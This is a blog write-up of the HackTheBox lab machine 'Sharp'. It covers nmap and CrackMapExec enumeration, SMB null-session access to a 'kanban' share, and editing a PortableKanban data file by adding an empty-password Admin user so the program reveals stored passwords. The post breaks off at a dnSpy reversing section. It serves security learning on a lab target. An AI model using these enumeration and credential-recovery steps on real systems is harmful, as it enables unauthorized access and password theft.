<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox - Sharp | Another infosec blog</title><!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/blog/en/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/blog/en/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/blog/en/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/blog/en/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/blog/en/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/blog/en/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/blog/en/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/blog/en/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/blog/en/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/blog/en/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/blog/en/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/blog/en/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/blog/en/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/blog/en/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/blog/en/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/en/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/blog/en/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/blog/en/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/blog/en/assets/css/post.css"><link rel="stylesheet" href="/blog/en/assets/css/post.css"><link rel="preload" as="style" href="/blog/en/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/blog/en/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/blog/en/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/blog/en/" alt="avatar"> <img src="/blog/en/assets/img/sample/avatar.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/blog/en/">Another infosec blog</a></div><div class="site-subtitle font-italic">Where one's enthusiasm provides comprehension and knowledge for others.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/legiahuyy" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0x7c00" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['legiahuy420','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/blog/en/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/en/"> Posts </a> </span> <span>HackTheBox - Sharp</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Sharp</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 15, 2021, 2:45 AM +0700" > May 15 <i class="unloaded">2021-05-15T02:45:00+07:00</i> </span> by <span class="author"> Huy </span></div></div><div class="post-content"><p>Hi, after a long time not posting anything on this blog because of my university workload. Let’s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox machine - Sharp, which is rated 4.8 pts.</p><h2 id="target-enumeration">Target enumeration</h2><p>On the very first step, we want to do a nmap scan on the target (10.10.10.219).</p><h3 id="nmap-output">Nmap output</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219</span>

Nmap scan report <span class="k">for </span>10.10.10.219
Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: <span class="nt">-48m56s</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-05-13T08:54:52
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>

Nmap <span class="k">done </span>at Thu May 13 05:44:27 2021 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>133.29 seconds
</pre></table></code></div></div><p>Nmap results provide us with different ports and service currently running on the remote host. We probably should focus on its SMB service.</p><h3 id="in-depth-enumeration-with-crackmapexec-cme">In-depth enumeration with CrackMapExec (CME)</h3><p>Instead of the old-fashioned Metasploit’s auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>apt-get <span class="nb">install </span>crackmapexec
</pre></table></code></div></div><p>or you can have it by cloning into <a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a>/<strong><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></strong> but you will need <a href="https://python-poetry.org/docs/#installation">Poetry</a> to manage dependencies.</p><h4 id="os-version">OS version</h4><p>Now, let’s check our target’s OS version using CME (Windows 10.0 Build 17763 x64).</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
└─# poetry run crackmapexec.spec smb 10.10.10.219         
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</pre></table></code></div></div><h4 id="shared-objects--access">Shared objects &amp; Access</h4><p>Next, I’d like to login using empty username and password, a null-session, to get some free share-objects on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
└─# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>  
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>-] Sharp<span class="se">\:</span> STATUS_ACCESS_DENIED 
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.219    445    SHARP            Share           Permissions     Remark
SMB         10.10.10.219    445    SHARP            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.219    445    SHARP            ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.219    445    SHARP            C<span class="nv">$ </span>                             Default share
SMB         10.10.10.219    445    SHARP            dev                             
SMB         10.10.10.219    445    SHARP            IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.219    445    SHARP            kanban          READ            
</pre></table></code></div></div><p>The most notable one here is the <code class="language-plaintext highlighter-rouge">kanban</code> share-directory because we don’t know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.</p><h4 id="spider_plus-json">Spider_plus JSON</h4><p>Another thing you can do with CME is using its modules, in this case is <code class="language-plaintext highlighter-rouge">spider_plus</code> to crawl information from target host (directories, file names, sizes, …) and save it as JSON under <code class="language-plaintext highlighter-rouge">/tmp/cme_spider_plus</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
└─# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> spider_plus 
SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.219    445    SHARP            <span class="o">[</span>-] Sharp<span class="se">\:</span> STATUS_ACCESS_DENIED 
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started spidering plus with option:
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        DIR: <span class="o">[</span><span class="s1">'print$'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        EXT: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>       SIZE: 51200
SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>     OUTPUT: /tmp/cme_spider_plus

</pre></table></code></div></div><p>So organized, isn’t it?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png" alt="" /></p><p>These are all the items we can enumerate with a null-session.</p><h2 id="kanban-share-files">Kanban share files</h2><p>Using smbclient to connect to <code class="language-plaintext highlighter-rouge">kanban</code> directory on remote machine and download files back to our Linux.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Connect to remote host with null credentials</span>
smbclient <span class="nt">-N</span> //10.10.10.219/kanban

<span class="c"># Download all existing files</span>
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
</pre></table></code></div></div><p>You might want to take a look at those <code class="language-plaintext highlighter-rouge">.pk3</code> and <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> files as aforementioned, they are likely to contain useful information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png" alt="" /></p><p>After downloading, you can extract the <code class="language-plaintext highlighter-rouge">pkb.zip</code> using <code class="language-plaintext highlighter-rouge">unzip</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/Sharp/smb/kanban/pkb]
└─# unzip pkb.zip     
Archive:  pkb.zip
  inflating: CommandLine.dll         
  inflating: CsvHelper.dll           
  inflating: DotNetZip.dll           
  inflating: Itenso.Rtf.Converter.Html.dll  
  inflating: Itenso.Rtf.Interpreter.dll  
  inflating: Itenso.Rtf.Parser.dll   
  inflating: Itenso.Sys.dll          
  inflating: MsgReader.dll           
  inflating: Ookii.Dialogs.dll       
   creating: Plugins/
  inflating: Plugins/PluginsLibrary.dll  
  inflating: PortableKanban.Data.dll  
  inflating: PortableKanban.exe      
  inflating: PortableKanban.Extensions.dll  
  inflating: ServiceStack.Common.dll  
  inflating: ServiceStack.Interfaces.dll  
  inflating: ServiceStack.Redis.dll  
  inflating: ServiceStack.Text.dll   
  inflating: User Guide.pdf
  
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/HackTheBox/Sharp/smb/kanban]
└─<span class="nv">$ </span><span class="nb">md5sum </span>PortableKanban.pk<span class="k">*</span>
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
   
</pre></table></code></div></div><p>Skim through the files and we have these users in <code class="language-plaintext highlighter-rouge">PortableKanban.pk3</code>.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="err">/*</span><span class="w"> </span><span class="err">PortableKanban.pk</span><span class="mi">3</span><span class="w"> </span><span class="err">*/</span><span class="w">
  </span><span class="nl">"Users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Administrator"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"k+iUoOvQYG98PuhhRC7/rg=="</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">Base</span><span class="mi">64</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0628ae1de5234b81ae65c246dd2b4a21"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lars"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ua3LyPFM175GN8D3+tqwLA=="</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"User"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769265925600</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><h3 id="reveal-administrator-password-by-re-configurating-kanban-pk3-file">Reveal administrator password by re-configurating Kanban PK3 file</h3><p>Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> to decrypt passwords for us since they are stored offline but you’ve might already known that only privileged users can read the password in plain text. Let’s add ourselves in with <em>Admin</em> role by copy-paste <code class="language-plaintext highlighter-rouge">Administrator</code> section and change the name and id.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">/*</span><span class="w"> </span><span class="err">PortableKanban.pk</span><span class="mi">3</span><span class="w"> </span><span class="err">*/</span><span class="w">	</span><span class="nl">"Users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">    </span><span class="p">{</span><span class="w">      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Administrator"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"k+iUoOvQYG98PuhhRC7/rg=="</span><span class="p">,</span><span class="w">      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">    </span><span class="p">},</span><span class="w">    </span><span class="p">{</span><span class="w">      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0628ae1de5234b81ae65c246dd2b4a21"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lars"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ua3LyPFM175GN8D3+tqwLA=="</span><span class="p">,</span><span class="w">      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"User"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769265925600</span><span class="w">    </span><span class="p">},</span><span class="w">    </span><span class="p">{</span><span class="w">      </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a1"</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">We</span><span class="w"> </span><span class="err">also</span><span class="w"> </span><span class="err">need</span><span class="w"> </span><span class="err">to</span><span class="w"> </span><span class="err">change</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">id</span><span class="w">      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"huy"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Initials"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"Email"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">      </span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> 					</span><span class="err">//</span><span class="w"> </span><span class="err">Empty</span><span class="w"> </span><span class="err">password</span><span class="w">      </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">      </span><span class="nl">"Inactive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">      </span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="w"> </span><span class="mi">637409769245503700</span><span class="w">    </span><span class="p">}</span><span class="w">  </span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>Then we execute <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code>, open Users tab in the setup dialog and we are now able to read the passwords.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-13.png" alt="" /></p><h3 id="alternative-method">Alternative method</h3><p>If you love doing thing <em>the-hard-way</em>, feel free to reverse the program and reproduce its decrypt method. Luckily, <code class="language-plaintext highlighter-rouge">PortableKanban.exe</code> and its components are compiled in C# which makes it easier for us.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png" alt="" /></p><h4 id="finding-credentials-with-dnspy">Finding credentials with dnSpy</h4><p>Load the target’s executables and DLLs in dnSpy, we can have their 